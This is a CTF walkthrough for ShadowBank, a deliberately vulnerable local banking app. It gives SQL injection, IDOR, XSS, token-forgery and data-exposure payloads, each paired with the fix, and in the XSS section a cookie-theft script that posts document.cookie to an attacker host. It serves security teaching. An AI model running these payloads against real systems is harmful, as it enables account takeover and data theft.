# üè¶ ShadowBank CTF - Complete Vulnerability Walkthrough

> **Complete step-by-step guide to solving all security vulnerabilities and mastering API security testing**

---

## üìö Table of Contents

1. [Introduction](#-introduction)
2. [Environment Setup](#-environment-setup)
3. [Challenge 1: SQL Injection Login Bypass](#-challenge-1-sql-injection-login-bypass)
4. [Challenge 2: BOLA / IDOR Attack](#-challenge-2-bola--idor-attack)
5. [Challenge 3: Reflected XSS Attack](#-challenge-3-reflected-xss-attack)
6. [Challenge 4: Sensitive Data Exposure](#-challenge-4-sensitive-data-exposure)
7. [Challenge 5: API Key Theft](#-challenge-5-api-key-theft)
8. [Challenge 6: Mass Assignment](#-challenge-6-mass-assignment)
9. [Challenge 7: Token Enumeration](#-challenge-7-token-enumeration)
10. [Challenge 8: Hidden Admin Account](#-challenge-8-hidden-admin-account)
11. [Completion Recap](#-completion-recap)
12. [Next Steps](#-next-steps)

---

## üìö Introduction

Welcome to the ShadowBank CTF Walkthrough! This guide will teach you how to identify and exploit common API vulnerabilities found in real-world applications. ShadowBank is a deliberately vulnerable banking application designed for educational purposes.

> ‚ö†Ô∏è **Legal Warning**  
> Only use these techniques on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal and unethical.

### What You'll Learn

- SQL Injection attack techniques and prevention
- Broken Object Level Authorization (BOLA/IDOR)
- Cross-Site Scripting (XSS) attacks
- Sensitive data exposure detection
- API authentication weaknesses
- Mass assignment vulnerabilities

### Prerequisites

- Basic understanding of HTTP requests (GET, POST)
- Familiarity with web browsers and developer tools
- Optional: Burp Suite or similar proxy tool

---

## üîß Environment Setup

### Option 1: Browser Simulation Mode (Easiest)

This mode runs entirely in your browser - perfect for learning without any setup!

```bash
cd shadowbank
npm install
npm run dev
# Open http://localhost:5173/
```

### Option 2: Full Stack Mode (Recommended for Burp Suite)

This mode runs a real Python backend for more realistic testing.

```bash
# Terminal 1 - Backend
cd backend
pip install flask flask-cors
python app.py
# Server runs on http://127.0.0.1:5000

# Terminal 2 - Frontend
npm run dev
# Open http://localhost:5173
```

> üí° **Pro Tip**  
> On the login screen, switch to "Local Python" mode to use the real backend. This allows you to intercept requests with Burp Suite.

### Test Accounts

| Username | Password | Role | User ID |
|----------|----------|------|---------|
| `victim` | `12345` | Rich User | 1 |
| `attacker` | `12345` | Attacker | 2 |
| `admin` | `12345` | Hidden Admin | 3 |

---

## üíâ Challenge 1: SQL Injection Login Bypass

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê‚≠ê Medium | Injection | 200 |

### üìñ Background

SQL Injection occurs when user input is directly concatenated into SQL queries without proper sanitization. Attackers can manipulate the query logic to bypass authentication, extract data, or even modify the database.

### üîç Understanding the Vulnerability

Look at how the backend handles login (in `backend/app.py`):

```python
# VULNERABLE CODE - DO NOT USE IN PRODUCTION!
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # This is the vulnerability - string concatenation!
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

The problem? User input is directly inserted into the SQL query. If an attacker enters special characters, they can change the query's logic.

### üéØ Exploitation Steps

**Step 1: Navigate to the Login Page**

Open the ShadowBank application at `http://localhost:5173`

**Step 2: Identify the Input Fields**

Notice the username and password fields. These are sent to the server in a POST request.

**Step 3: Test for SQL Injection**

Try entering a single quote `'` in the username field. If you get an error, the application might be vulnerable.

**Step 4: Craft the Payload**

Enter this in the username field:

```sql
' OR 1=1 --
```

Password can be anything (e.g., `x`)

**Step 5: Understand the Payload**

The original query becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'x'
```

- `'` - Closes the username string
- `OR 1=1` - Always true condition
- `--` - Comments out the rest of the query

**Step 6: Click "Sign In"**

You should be logged in as the first user in the database (the victim)!

> ‚úÖ **Challenge Complete!**  
> You've successfully bypassed authentication using SQL Injection. **+200 points**

### üõ°Ô∏è How to Fix

Use parameterized queries (prepared statements) instead of string concatenation:

```python
# SECURE CODE
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)  # Parameters are safely escaped
)
```

### üìö Learn More

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Tutorial](https://portswigger.net/web-security/sql-injection)

---

## üö™ Challenge 2: BOLA / IDOR Attack

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê Easy | Broken Access Control | 100 |

### üìñ Background

**Broken Object Level Authorization (BOLA)**, also known as **Insecure Direct Object Reference (IDOR)**, is the #1 API security vulnerability according to OWASP. It occurs when an API doesn't verify that the user has permission to access the requested resource.

### üîç Understanding the Vulnerability

The transaction endpoint in `backend/app.py`:

```python
@app.route('/api/transactions/<int:transaction_id>')
def get_transaction(transaction_id):
    # Check if user is authenticated
    user = get_user_from_token(token)  # ‚úÖ Good
    
    # Find transaction by ID
    transaction = find_transaction_by_id(transaction_id)
    
    # ‚ö†Ô∏è VULNERABILITY: No ownership check!
    # We return ANY transaction, not just the user's
    return jsonify(transaction)
```

### üéØ Exploitation Steps

**Step 1: Login as the Attacker**

Username: `attacker`, Password: `12345`

**Step 2: View Your Own Transactions**

On the dashboard, you'll see your transactions. Click on one and note its ID. The attacker's transaction IDs are: 3, 4, 8, 9, 10, 12, 14, 15

**Step 3: Find the API Console**

On the right side of the dashboard, you'll see "Developer / API Console" with an input field for "Target Transaction ID"

**Step 4: Try Accessing Another User's Transaction**

Enter transaction ID `1` (belongs to victim) and click "GET"

**Step 5: View the Sensitive Data**

You should see the victim's confidential transaction:

```json
{
  "id": 1,
  "user_id": 1,
  "amount": -50000.00,
  "description": "Wire Transfer - Offshore Holdings",
  "recipient_account": "KY-2929-1111"
}
```

### Using Burp Suite (Advanced)

For a more realistic attack, use Burp Suite to intercept and modify requests:

```http
GET /api/transactions/1 HTTP/1.1
Host: localhost:5000
Authorization: Bearer 2  ‚Üê Attacker's token, but accessing ID 1
```

> üö® **Impact**  
> An attacker can enumerate all transaction IDs (1, 2, 3, ...) to steal everyone's financial data!

> ‚úÖ **Challenge Complete!**  
> You've demonstrated BOLA/IDOR vulnerability. **+100 points**

### üõ°Ô∏è How to Fix

```python
def get_transaction(transaction_id):
    user = get_user_from_token(token)
    transaction = find_transaction_by_id(transaction_id)
    
    # ‚úÖ FIX: Check ownership!
    if transaction.user_id != user.id:
        return {"error": "Forbidden"}, 403
    
    return jsonify(transaction)
```

---

## ‚ö° Challenge 3: Reflected XSS Attack

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê‚≠ê Medium | XSS | 200 |

### üìñ Background

**Cross-Site Scripting (XSS)** allows attackers to inject malicious scripts into web pages viewed by other users. There are three types:

- **Reflected XSS:** Script is reflected off a web server (in response)
- **Stored XSS:** Script is permanently stored on the target server
- **DOM-based XSS:** Vulnerability exists in client-side code

### üîç Understanding the Vulnerability

The search endpoint returns user input without sanitization:

```python
@app.route('/api/search')
def search():
    q = request.args.get('q', '')
    
    # ‚ö†Ô∏è VULNERABILITY: User input directly in HTML!
    html = f"""
    <html>
      <body>
        <h3>Search Results</h3>
        <div>You searched for: {q}</div>
      </body>
    </html>
    """
    return Response(html, mimetype='text/html')
```

### üéØ Exploitation Steps

**Step 1: Find the Vulnerable Endpoint**

The `/api/search` endpoint takes a query parameter `q`

**Step 2: Test Normal Input**

Visit: `http://localhost:5000/api/search?q=test`

You'll see: "You searched for: test"

**Step 3: Inject JavaScript**

Visit this URL:

```
http://localhost:5000/api/search?q=<script>alert('XSS')</script>
```

**Step 4: Observe the Attack**

An alert box pops up showing "XSS" - your script executed!

**Step 5: Real-World Attack Scenario**

An attacker could steal cookies/tokens:

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

> ‚úÖ **Challenge Complete!**  
> You've executed a reflected XSS attack. **+200 points**

### üõ°Ô∏è How to Fix

```python
from markupsafe import escape

@app.route('/api/search')
def search():
    q = request.args.get('q', '')
    
    # ‚úÖ FIX: Escape special HTML characters
    safe_q = escape(q)
    
    html = f"You searched for: {safe_q}"
    return Response(html, mimetype='text/html')
```

---

## üìã Challenge 4: Sensitive Data Exposure

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê‚≠ê‚≠ê Hard | Sensitive Data Exposure | 300 |

### üìñ Background

Sensitive Data Exposure occurs when applications don't adequately protect sensitive information such as passwords, API keys, or personal data. This often happens through:

- Unprotected admin endpoints
- Weak or missing authentication
- Sensitive data in URLs or logs
- Data transmitted without encryption

### üîç Understanding the Vulnerability

An admin endpoint exists without any authentication:

```python
@app.route('/api/admin/users')
def admin_users():
    # ‚ö†Ô∏è VULNERABILITY: No authentication required!
    # Anyone can access all user data including passwords
    return jsonify({'users': list(users.values())})
```

### üéØ Exploitation Steps

**Step 1: Think Like an Attacker**

Common admin endpoint patterns to try:
- `/api/admin`
- `/api/admin/users`
- `/api/users/all`
- `/admin/dashboard`

**Step 2: Access the Admin Endpoint**

Open your browser or use curl:

```bash
curl http://localhost:5000/api/admin/users
```

**Step 3: View the Exposed Data**

You'll receive all users with their sensitive information:

```json
{
  "users": [
    {
      "id": 1,
      "username": "victim",
      "password": "12345",        ‚Üê Password exposed!
      "api_key": "key_victim_secret_123",
      "balance": 1500000.00
    },
    {
      "id": 2,
      "username": "attacker",
      "password": "12345",
      "api_key": "key_attacker_public_456",
      "balance": 50.00
    },
    {
      "id": 3,
      "username": "admin",
      "password": "12345",
      "api_key": "key_admin_super_secret_789",
      "balance": 999999999.99
    }
  ]
}
```

> üö® **What You Found**
> - All usernames and passwords in plaintext
> - Secret API keys for each user
> - Account balances and personal data
> - A hidden admin account!

> ‚úÖ **Challenge Complete!**  
> You've discovered a sensitive data exposure vulnerability. **+300 points**

### üõ°Ô∏è How to Fix

```python
@app.route('/api/admin/users')
def admin_users():
    # ‚úÖ FIX 1: Require admin authentication
    user = get_user_from_token(request.headers.get('Authorization'))
    if not user or not user.is_admin:
        return {"error": "Forbidden"}, 403
    
    # ‚úÖ FIX 2: Never expose passwords/API keys
    safe_users = [{"id": u.id, "username": u.username} for u in users]
    return jsonify({'users': safe_users})
```

---

## üîë Challenge 5: API Key Theft

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê‚≠ê Medium | Broken Access Control | 200 |

### üìñ Background

API keys are often used for authentication and authorization. If an attacker can steal another user's API key, they can impersonate that user and access their resources.

### üéØ Exploitation Steps

**Step 1: Use the Data Exposure Vulnerability**

From Challenge 4, you already have access to `/api/admin/users`

**Step 2: Extract API Keys**

From the response, copy the victim's API key:

```
key_victim_secret_123
```

**Step 3: Use the Stolen Key**

In a real application, you could use this key to authenticate as the victim and access their resources.

> ‚úÖ **Challenge Complete!**  
> You've successfully stolen API keys through data exposure. **+200 points**

---

## üìù Challenge 6: Mass Assignment

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê‚≠ê‚≠ê‚≠ê Expert | Improper Input Validation | 400 |

### üìñ Background

**Mass Assignment** (also called "Auto-binding" or "Object Injection") occurs when an application automatically binds HTTP request parameters to object properties without filtering. Attackers can modify fields they shouldn't have access to.

### üîç Conceptual Vulnerability

```python
# Vulnerable: Accepts ALL fields from request
@app.route('/api/profile', methods=['PUT'])
def update_profile():
    data = request.get_json()
    user = get_current_user()
    
    # ‚ö†Ô∏è Blindly updating all fields!
    for key, value in data.items():
        setattr(user, key, value)
    
    return {"message": "Updated"}
```

### üéØ Attack Scenario

Imagine you could update your profile. The intended request:

```http
PUT /api/profile HTTP/1.1
Content-Type: application/json

{
  "name": "Hacker",
  "email": "hacker@test.com"
}
```

An attacker tries adding extra fields:

```http
PUT /api/profile HTTP/1.1
Content-Type: application/json

{
  "name": "Hacker",
  "email": "hacker@test.com",
  "balance": 999999999,    ‚Üê Injected!
  "is_admin": true         ‚Üê Injected!
}
```

> üí° **Note**  
> This vulnerability isn't currently implemented in ShadowBank's active endpoints, but understanding it is crucial for real-world security testing.

### üõ°Ô∏è How to Fix

```python
# ‚úÖ Secure: Whitelist allowed fields
ALLOWED_FIELDS = ['name', 'email']

@app.route('/api/profile', methods=['PUT'])
def update_profile():
    data = request.get_json()
    user = get_current_user()
    
    for key, value in data.items():
        if key in ALLOWED_FIELDS:
            setattr(user, key, value)
    
    return {"message": "Updated"}
```

---

## üîê Challenge 7: Token Enumeration

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê‚≠ê‚≠ê Hard | Cryptographic Failures | 300 |

### üìñ Background

Authentication tokens should be random and unpredictable. If tokens follow a predictable pattern (like sequential IDs), attackers can guess valid tokens and hijack sessions.

### üîç Understanding the Vulnerability

```python
# In the login function:
return jsonify({
    'token': str(user['id']),  # ‚ö†Ô∏è Token is just the user ID!
    'user': ...
})
```

Tokens are just: `"1"`, `"2"`, `"3"`...

### üéØ Exploitation Steps

**Step 1: Login and Observe Your Token**

Login as `attacker`. In DevTools (F12) ‚Üí Network, check the login response:

```json
{"token": "2", "user": {...}}
```

Your token is just `"2"`!

**Step 2: Guess Other Tokens**

Tokens are just user IDs. Try using token `"1"` (victim) in your requests.

**Step 3: Hijack a Session**

Make a request with a forged Authorization header:

```bash
curl http://localhost:5000/api/dashboard \
  -H "Authorization: Bearer 1"
```

You'll receive the victim's dashboard data!

> ‚úÖ **Challenge Complete!**  
> You've demonstrated how weak tokens can be exploited. **+300 points**

### üõ°Ô∏è How to Fix

```python
import secrets
import jwt

# ‚úÖ Option 1: Use cryptographically secure random tokens
token = secrets.token_urlsafe(32)

# ‚úÖ Option 2: Use JWTs with a secret key
token = jwt.encode(
    {'user_id': user.id, 'exp': datetime.utcnow() + timedelta(hours=1)},
    SECRET_KEY,
    algorithm='HS256'
)
```

---

## ‚öôÔ∏è Challenge 8: Hidden Admin Account

| Difficulty | Category | Points |
|------------|----------|--------|
| ‚≠ê‚≠ê‚≠ê‚≠ê Expert | Security Misconfiguration | 400 |

### üìñ Background

Security misconfigurations include default credentials, hidden debug endpoints, unused admin accounts, and improperly secured features left from development.

### üéØ Exploitation Steps

**Step 1: Use Information from Previous Challenges**

From the `/api/admin/users` endpoint (Challenge 4), you saw a user with id 3:

```json
{
  "id": 3,
  "username": "admin",
  "password": "12345"
}
```

**Step 2: Login as Admin**

Use the discovered credentials:
- Username: `admin`
- Password: `12345`

**Step 3: Access Admin Resources**

As admin, you now have access to a balance of $999,999,999.99 and can see admin-level transactions!

> ‚úÖ **Challenge Complete!**  
> You've discovered and accessed the hidden admin account. **+400 points**

### üõ°Ô∏è How to Prevent

- Remove or disable all test/debug accounts in production
- Use strong, unique passwords for admin accounts
- Implement proper access control for admin endpoints
- Use security scanning tools to detect misconfigurations
- Follow the principle of least privilege

---

## üèÜ Completion Recap

| # | Challenge | Category | Points | Key Takeaway |
|---|-----------|----------|--------|--------------|
| 1 | SQL Injection | Injection | 200 | Use parameterized queries |
| 2 | BOLA/IDOR | Access Control | 100 | Always verify resource ownership |
| 3 | Reflected XSS | XSS | 200 | Escape user input in HTML |
| 4 | Data Exposure | Data Exposure | 300 | Protect admin endpoints |
| 5 | API Key Theft | Access Control | 200 | Never expose secrets |
| 6 | Mass Assignment | Input Validation | 400 | Whitelist allowed fields |
| 7 | Token Enumeration | Crypto Failures | 300 | Use cryptographic tokens |
| 8 | Hidden Admin | Misconfiguration | 400 | Remove test accounts |

> üéâ **Congratulations!**  
> If you completed all challenges, you've earned **2100 points** and learned essential API security concepts!

---

## üìà Next Steps

### Continue Learning

- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) - More complex vulnerabilities
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Free in-depth courses
- [Hack The Box](https://www.hackthebox.com/) - Realistic penetration testing labs
- [TryHackMe](https://tryhackme.com/) - Beginner-friendly learning paths

### Tools to Master

- **Burp Suite** - Professional web security testing tool
- **OWASP ZAP** - Free open-source alternative
- **sqlmap** - Automated SQL injection tool
- **Postman/Insomnia** - API testing
- **ffuf/gobuster** - Directory and endpoint discovery

---

## üîó Quick Reference

### Vulnerable Endpoints

| Endpoint | Vulnerability | Challenge |
|----------|---------------|-----------|
| `POST /api/login` | SQL Injection | #1 |
| `GET /api/transactions/{id}` | BOLA/IDOR | #2 |
| `GET /api/search?q=` | Reflected XSS | #3 |
| `GET /api/admin/users` | Data Exposure | #4, #5, #8 |

### Attack Payloads

```bash
# SQL Injection
' OR 1=1 --

# XSS
<script>alert('XSS')</script>

# BOLA - Access other user's data
GET /api/transactions/1
Authorization: Bearer 2

# Sensitive Data
curl http://localhost:5000/api/admin/users
```

---

**üè¶ ShadowBank CTF - Built for learning API security**

*Remember: Only test on systems you own or have permission to test!*
